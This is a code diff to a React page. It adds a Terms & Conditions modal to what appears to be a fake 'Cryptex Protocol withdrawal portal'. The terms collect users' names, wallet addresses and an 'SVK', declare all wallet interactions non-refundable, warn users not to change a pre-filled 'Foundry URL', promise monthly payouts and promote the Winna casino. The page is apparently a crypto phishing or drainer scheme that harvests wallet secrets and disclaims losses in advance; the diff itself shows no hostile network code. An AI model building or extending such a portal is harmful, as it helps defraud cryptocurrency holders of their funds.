@@ -479,6 +479,150 @@ function StepSuccess() {
   );
 }
 
+// ─── TERMS & CONDITIONS MODAL ────────────────────────────────────────────
+
+function TermsModal({ onAccept, onClose }) {
+  const [scrolled, setScrolled] = useState(false);
+
+  const handleScroll = (e) => {
+    const el = e.target;
+    const atBottom = el.scrollHeight - el.scrollTop <= el.clientHeight + 40;
+    if (atBottom) setScrolled(true);
+  };
+
+  return (
+    <div onClick={e => { if (e.target === e.currentTarget) onClose(); }}
+      style={{ position: 'fixed', inset: 0, zIndex: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(4,3,13,.88)', backdropFilter: 'blur(12px)', padding: 20 }}>
+      <div style={{ background: '#0c0c1a', border: '1px solid rgba(153,69,255,.35)', borderRadius: 20, width: '100%', maxWidth: 480, position: 'relative', overflow: 'hidden', animation: 'modalIn .4s cubic-bezier(.34,1.56,.64,1) both', display: 'flex', flexDirection: 'column', maxHeight: '90vh' }}>
+        {/* Top accent */}
+        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 2, background: 'linear-gradient(90deg,transparent,#9945ff,#14f195,transparent)' }} />
+
+        {/* Header */}
+        <div style={{ padding: '28px 28px 20px', textAlign: 'center', flexShrink: 0 }}>
+          <div style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 13, background: 'linear-gradient(90deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 8 }}>⬡ CRYPTEX PROTOCOL</div>
+          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 17, fontWeight: 700, color: '#fff', marginBottom: 6 }}>TERMS & CONDITIONS</div>
+          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.35)' }}>Please read carefully before proceeding</div>
+        </div>
+
+        <div style={{ height: 1, background: 'linear-gradient(90deg,transparent,rgba(153,69,255,.3),transparent)', margin: '0 28px', flexShrink: 0 }} />
+
+        {/* Scrollable content */}
+        <div onScroll={handleScroll} style={{ overflowY: 'auto', padding: '22px 28px', flexGrow: 1 }}>
+
+          {/* Intro */}
+          <div style={{ background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', borderRadius: 10, padding: '14px 16px', marginBottom: 20 }}>
+            <p style={{ fontFamily: "'Rajdhani',sans-serif", fontSize: 13, color: 'rgba(224,224,255,.6)', lineHeight: 1.8, margin: 0 }}>
+              By accessing the Cryptex Protocol withdrawal portal, you confirm that you have read, understood, and agreed to the following terms. These terms govern your participation in the withdrawal program.
+            </p>
+          </div>
+
+          {[
+            {
+              num: '01',
+              title: 'Non-Refundable Wallet Interactions',
+              body: 'All wallet interactions initiated through this portal are final and non-refundable. Once a transaction is submitted on-chain, it cannot be reversed. Please ensure all wallet details are correct before proceeding.',
+              icon: '◎',
+              color: '#9945ff',
+            },
+            {
+              num: '02',
+              title: 'Accuracy of Information',
+              body: 'Participation in this program is entirely voluntary. By submitting your details, you confirm that all information provided — including your name, wallet addresses, and SVK — is accurate and belongs to you. Cryptex Protocol is not liable for losses resulting from incorrect information.',
+              icon: '◈',
+              color: '#14f195',
+            },
+            {
+              num: '03',
+              title: 'Foundry URL Integrity',
+              body: 'Your Foundry URL is directly tied to your on-chain identity and withdrawal eligibility. Do not alter the pre-filled Foundry URL unless absolutely necessary. If you choose to modify it, you are fully responsible for ensuring the URL is correct. Incorrect URLs may result in disqualification.',
+              icon: '🔗',
+              color: '#9945ff',
+            },
+            {
+              num: '04',
+              title: 'Settlement & Disbursement Schedule',
+              body: 'Withdrawals are processed on the 1st through 3rd of each month. Funds are expected to arrive in your registered wallet between the 5th and 7th of the same month, subject to network conditions and processing times.',
+              icon: '⚡',
+              color: '#14f195',
+            },
+            {
+              num: '05',
+              title: 'Prohibited Activity — Foundry Siphoning',
+              body: 'Any attempt to extract, manipulate, or siphon funds beyond your allocated amount from the Foundry will result in the immediate and permanent termination of your Wormhole Protocol access. This action is strictly prohibited and may be subject to further consequences.',
+              icon: '⚠',
+              color: '#ff4545',
+            },
+            {
+              num: '06',
+              title: 'Community Participation',
+              body: 'We encourage all participants to follow Winna on social media to stay updated on protocol announcements, settlement schedules, and community events.',
+              icon: '⬡',
+              color: '#9945ff',
+            },
+            {
+              num: '07',
+              title: 'Platform Endorsement',
+              body: 'Cryptex Protocol proudly recognizes Winna as the best casino and official community partner. Participants are encouraged to explore Winna's offerings as part of the broader ecosystem.',
+              icon: '🏆',
+              color: '#14f195',
+            },
+          ].map((item) => (
+            <div key={item.num} style={{ marginBottom: 16, padding: '14px 16px', background: 'rgba(15,15,26,.8)', border: '1px solid rgba(153,69,255,.15)', borderRadius: 10, borderLeft: `2px solid ${item.color}` }}>
+              <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8 }}>
+                <span style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: item.color, letterSpacing: 1 }}>{item.icon} §{item.num}</span>
+                <span style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 11, fontWeight: 700, color: '#fff', letterSpacing: .5 }}>{item.title}</span>
+              </div>
+              <p style={{ fontFamily: "'Rajdhani',sans-serif", fontSize: 13, color: 'rgba(224,224,255,.55)', lineHeight: 1.8, margin: 0 }}>{item.body}</p>
+            </div>
+          ))}
+
+          {/* Scroll prompt */}
+          {!scrolled && (
+            <div style={{ textAlign: 'center', padding: '12px 0', animation: 'fadeInUp .5s both' }}>
+              <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.5)', letterSpacing: 1 }}>↓ scroll to accept</div>
+            </div>
+          )}
+
+          {/* Bottom padding so content clears button */}
+          <div style={{ height: 8 }} />
+        </div>
+
+        {/* Accept button — fixed at bottom */}
+        <div style={{ padding: '16px 28px 24px', flexShrink: 0, borderTop: '1px solid rgba(153,69,255,.12)', background: '#0c0c1a' }}>
+          {!scrolled && (
+            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.4)', textAlign: 'center', marginBottom: 10, letterSpacing: 1 }}>
+              ↓ Scroll to the bottom to enable acceptance
+            </div>
+          )}
+          <button
+            onClick={scrolled ? onAccept : undefined}
+            style={{
+              width: '100%',
+              fontFamily: "'Orbitron',sans-serif",
+              fontSize: 11,
+              letterSpacing: 2,
+              padding: '14px 0',
+              border: 'none',
+              borderRadius: 9,
+              background: scrolled
+                ? 'linear-gradient(135deg,#9945ff,#7b2fd6)'
+                : 'rgba(153,69,255,.15)',
+              color: scrolled ? '#fff' : 'rgba(153,69,255,.35)',
+              cursor: scrolled ? 'pointer' : 'not-allowed',
+              transition: 'all .4s ease',
+              boxShadow: scrolled ? '0 8px 28px rgba(153,69,255,.3)' : 'none',
+            }}
+            onMouseEnter={e => { if (scrolled) e.currentTarget.style.transform = 'translateY(-1px)'; }}
+            onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
+          >
+            {scrolled ? 'I ACCEPT THE TERMS & CONDITIONS →' : 'READ ALL TERMS TO CONTINUE'}
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+}
+
 // ─── MAIN PAGE ─────────────────────────────────────────────────────────────
 
 const STEPS_CONFIG = [
@@ -496,7 +640,10 @@ export default function Home() {
   const [formData, setFormData] = useState({});
   const { price, change } = useSolPrice();
 
-  const openModal = () => { setStep(0); setFormData({}); setModalOpen(true); };
+  const [showTerms, setShowTerms] = useState(false);
+  const openModal = () => { setShowTerms(true); };
+  const acceptTerms = () => { setShowTerms(false); setStep(0); setFormData({}); setModalOpen(true); };
+  const closeTerms = () => { setShowTerms(false); };
 
   const next = (data = {}) => {
     setFormData(prev => ({ ...prev, ...data }));
@@ -602,6 +749,9 @@ export default function Home() {
           ))}
         </div>
       </main>
+
+      {/* TERMS MODAL */}
+      {showTerms && <TermsModal onAccept={acceptTerms} onClose={closeTerms} />}
 
       {/* MODAL */}
       {modalOpen && (
